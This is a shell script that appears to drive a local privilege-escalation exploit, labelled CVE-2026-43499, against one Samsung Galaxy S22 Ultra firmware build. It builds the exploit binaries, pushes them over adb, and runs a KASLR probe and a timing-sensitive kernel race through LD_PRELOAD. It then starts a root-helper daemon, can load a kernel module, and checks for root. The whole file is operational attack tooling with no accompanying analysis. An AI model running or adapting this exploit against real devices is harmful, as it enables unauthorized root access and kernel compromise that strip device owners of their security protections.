#!/usr/bin/env bash
# Run CVE-2026-43499 (IonStack) on Galaxy S22 Ultra SM-S908U1 / S908U1UEU8GYJ1.
#
# The race stage is timing-sensitive and can panic the kernel.  Reboot first
# for a clean slab/heap state, keep the screen unlocked and leave the phone
# idle while it runs.
#
# Usage:
#   ./document/run-S908U1UEU8GYJ1.sh              # 16 attempts, default delays
#   ./document/run-S908U1UEU8GYJ1.sh slide        # KASLR-slide probe only
#   ./document/run-S908U1UEU8GYJ1.sh insmod       # + KernelSU-Next late load
#
# Env overrides:
#   EXPLOIT_ATTEMPTS=24      number of independent attempts (1..64)
#   PSELECT_DELAY_USEC=20000 base delay for the sweep
#   EXP32_STAMP_OFFS=...     per-attempt stack-stamp offset sweep
#                             (e.g. 0x58,0x48,0x68 — geometry probe)
#   ROOT_HELPER_INSMOD=path  insmod a .ko right after the root daemon is up
#   ROOT_HELPER_CMD=cmd      run a command through the root helper daemon

set -u

TARGET="${TARGET:-S908U1UEU8GYJ1}"
REPO="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
OUT="$REPO/build/$TARGET/bin"
REMOTE=/data/local/tmp

MODE="${1:-run}"

step() { printf '\n\033[1;36m==> %s\033[0m\n' "$*"; }

step "Build ($TARGET)"
make -C "$REPO" PROJECT="$TARGET" HOST_CC32=ndk-only clean preload root-helper

step "Verify embedded exp32 matches the standalone binary"
sha256sum "$OUT/cve-exp32" "$REPO/build/embed/cve_exp32_arm32"

step "Push to device"
adb push "$OUT/cve-2026-43499"     "$REMOTE/cve-2026-43499"
adb push "$OUT/cve-2026-43499-root" "$REMOTE/cve-2026-43499-root"
adb push "$OUT/cve-exp32"           "$REMOTE/cve-exp32"
adb shell chmod 755 "$REMOTE/cve-2026-43499" "$REMOTE/cve-2026-43499-root" \
                   "$REMOTE/cve-exp32"

step "Device pre-flight"
adb shell 'echo -n "model/build: "; getprop ro.product.model; getprop ro.build.version.incremental; echo -n "csc: "; getprop ril.official_cscver; echo -n "kernel: "; uname -r; echo -n "selinux: "; getenforce; ls -l /dev/ashmem'

if [ "$MODE" = "slide" ]; then
  step "KASLR slide probe (no race)"
  adb shell "cd $REMOTE && SLIDE_ONLY=1 LD_PRELOAD=$REMOTE/cve-2026-43499 sh -c 'echo SLIDE_PROBE_DONE'"
  exit $?
fi

if [ "${REBOOT_BEFORE_RUN:-0}" = "1" ]; then
  step "Rebooting for a clean slab/heap state"
  adb reboot
  adb wait-for-device
  sleep 20
fi

step "Run exploit"
# NOTE: a bare "sh" leaves an INTERACTIVE shell holding the adb pty, so
# `adb shell` never returns even though the exploit already finished.
# "sh -c ':'" runs the same LD_PRELOAD constructor and exits immediately.
adb shell "cd $REMOTE && LD_PRELOAD=$REMOTE/cve-2026-43499 sh -c ':'" </dev/null

step "Root check"
adb shell "$REMOTE/cve-2026-43499-root -c 'id; getenforce'" </dev/null

